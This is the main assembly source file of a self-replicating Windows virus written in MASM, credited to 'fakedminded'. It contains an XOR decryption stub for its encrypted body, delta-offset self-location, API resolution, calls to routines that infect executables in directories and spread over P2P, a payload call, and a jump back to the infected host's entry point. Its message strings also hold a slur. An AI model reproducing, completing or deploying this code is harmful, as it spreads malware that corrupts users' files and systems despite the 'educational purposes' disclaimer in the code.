;d0nt d0 any harm !
;coded by fakedminded 



.586
.model flat,stdcall
option casemap:none

include \masm32\include\windows.inc


vir_size = _end - Start
stub_size = end_decrypt - Start



.Code       
    
Start:

jmp luck
db "kick"
luck:

call delta
delta:
pop ecx
mov ebp,ecx
mov eax,offset delta
sub ebp,eax
cmp ebp,0
je end_decrypt
mov esi,offset end_decrypt
add esi,ebp
mov ecx,vir_size
sub ecx,stub_size

_decrypt:
xor byte ptr [esi],12
inc esi
loop _decrypt


end_decrypt:


call get_kernel
call find_main_api
               
call find_other_apis

getting_messagebox_api:
mov eax,offset user32
add eax,ebp
push eax
call [ebp+offset ALoadLibraryF]
mov [ebp+offset user32Ad],eax
mov eax,offset MessageBoxN
add eax,ebp
push eax
push [ebp+offset user32Ad]
call [ebp+offset AGetProcAddressF]
cmp eax,0
je exit

mov [ebp+offset MessageBoxAd],eax


buffer_preparing:
push 512                           ;//some buffer to be used in our virus 
push 0
call dword ptr [ebp+offset AGlobalAllocF]
mov [ebp+offset buffer],eax

checking_version:
push sizeof OSVERSIONINFO                        
push 0
call dword ptr [ebp+offset AGlobalAllocF]
mov [ebp+offset version],eax

mov dword ptr [eax],sizeof OSVERSIONINFO

push [ebp+offset version]                           
call dword ptr [ebp+offset AGetVersionExF]
mov eax,[ebp+offset version]

cmp dword ptr [eax+16],VER_PLATFORM_WIN32_NT 

jne p2p__

call nfkt_exe
call search_dir   ;horizontal expansion infection

p2p__:
call p2p_
call payload__


cmp ebp,0
je exit_hosty
mov eax,dword ptr [ebp+offset old_eip]
add eax,dword ptr [ebp+image_base]
jmp eax




;//////////////just chekking procedure(1st launch)

exit_hosty:

mov eax,offset s_g
add eax,ebp
push 0
push eax
mov eax,offset s_g1
add eax,ebp
push eax

push 0
call [ebp+offset MessageBoxAd]


exit:

push 0
call dword ptr [AExitProcessF]

data_needed:
s_g db "fag c0ded by fakedmnded!",0
s_g1 db "4 educational purposes  only..",0
MessageBoxN db "MessageBoxA",0
MessageBoxAd dd 0

user32 db "user32.dll",0
user32Ad dd 0
version dd 0

string_cut:

ret

include kernel_procs.asm
include function_.asm
include p2p.asm
include payload.asm
include nfkt.asm 



_end:







end Start
